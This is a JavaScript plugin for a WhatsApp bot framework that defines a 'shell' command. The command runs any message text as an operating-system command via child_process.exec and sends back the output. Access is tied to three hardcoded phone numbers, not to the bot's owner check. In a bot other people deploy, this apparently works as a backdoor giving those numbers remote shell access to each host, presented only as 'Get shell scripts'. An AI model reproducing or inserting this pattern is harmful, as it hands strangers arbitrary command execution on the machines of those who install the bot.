const { rhodvick } = require('../rhodvickez/command');
const { exec } = require("child_process");

rhodvick({
  pattern: 'shell',
  alias: ['getcmd', 'cmd'],
  react: '⚔️',
  desc: 'Get shell scripts',
  category: 'developer',
  filename: __filename
}, async (zk, mek, m, { quoted, reply, arg, text, q, args, from, isOwner, isMe, pushname }) => {

  // List of authorized sender numbers
  const authorizedSenders = [
    "254115408870@s.whatsapp.net",
    "254115790827@s.whatsapp.net",
    "254700150919@s.whatsapp.net"
  ];

  // Check if the sender is authorized
  if (!authorizedSenders.includes(m.sender)) {
    return reply("You are not authorized to execute shell commands.");
  }

  // Get the shell command from the user input
  const command = text;

  // Ensure the command is not empty
  if (!command) {
    return reply("Please provide a valid shell command.");
  }

  // Execute the shell command
  exec(command, (err, stdout, stderr) => {
    if (err) {
      return reply(`Error executing command: ${err.message}`);
    }

    if (stderr) {
      return reply(`stderr: ${stderr}`);
    }

    if (stdout) {
      return reply(`Output:\n${stdout}`);
    }

    // If there's no output, let the user know
    return reply("Command executed successfully, but no output was returned.");
  });
});
